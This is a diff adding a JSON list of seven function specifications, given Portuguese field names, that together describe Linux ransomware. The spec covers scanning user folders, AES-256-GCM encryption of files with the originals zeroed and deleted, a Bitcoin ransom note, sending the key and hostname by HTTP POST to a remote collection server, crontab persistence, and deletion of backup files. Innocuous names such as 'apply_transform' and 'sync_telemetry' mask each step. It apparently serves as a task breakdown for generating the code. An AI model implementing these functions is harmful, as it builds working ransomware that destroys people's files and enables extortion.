@@ -1,0 +1,30 @@
+[
+  {
+    "descricao": "Enumerate files recursively in ~/Documentos_Teste, ~/Documentos, ~/Downloads, ~/Imagens, /mnt using opendir/readdir. Filter by extensions .xlsx, .docx, .pdf, .txt, .csv, .jpg, .png, .db, .backup, .psd, .zip, .rar. Return a linked list of qualifying file paths.",
+    "nome": "scan_storage"
+  },
+  {
+    "descricao": "Generate 32 random bytes via RAND_bytes, encode to Base64 via EVP_EncodeBlock. Write JSON {\"aes_key\":\"<base64>\"} to /tmp/.master.key with permissions 0600. Also decode Base64-encoded management endpoint and payment identifier from source strings using custom base64_decode, returning them for later use.",
+    "nome": "init_session"
+  },
+  {
+    "descricao": "Given a file path and a 32-byte AES key (uint8_t*), generate 12-byte nonce via RAND_bytes, encrypt file contents using AES-256-GCM via EVP_CIPHER_CTX, write output to original_path.PROCESSED with format [12-byte nonce][ciphertext][16-byte GCM tag]. Overwrite original file with zeros, then remove using remove().",
+    "nome": "apply_transform"
+  },
+  {
+    "descricao": "Given a directory path, create file #_STATUS_NOTICE_#.txt containing text: request for 300 USD to Bitcoin address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa and instruction to contact via secure channel.",
+    "nome": "write_manifest"
+  },
+  {
+    "descricao": "Read /tmp/.master.key using fopen/fread, extract aes_key value via manual JSON parsing: use strstr to find \"\\\"aes_key\\\":\\\"\", advance pointer by strlen(\"\\\"aes_key\\\":\\\"\") (11 bytes), then strchr to find closing quote; validate length > 0. Obtain hostname via gethostname(). Construct JSON payload {\"aes_key\":\"<value>\",\"hostname\":\"<hostname>\"}. Transmit via HTTP POST to http://10.254.19.73:8080/collect using libcurl with Content-Type: application/json. On HTTP 200 response, remove /tmp/.master.key using remove().",
+    "nome": "sync_telemetry"
+  },
+  {
+    "descricao": "Read current crontab via popen(\"crontab -l\",\"r\"), check if entry '@reboot <path_to_binary>' exists. If not, add it via popen(\"crontab -\",\"w\"). Use runtime binary path obtained from argv[0] or similar.",
+    "nome": "register_service"
+  },
+  {
+    "descricao": "Scan directories ~/Documentos_Teste, ~/Documentos, ~/Downloads, ~/Imagens, /mnt recursively for files with extensions .bak, .backup, .old, and delete them using remove().",
+    "nome": "purge_residuals"
+  }
+]
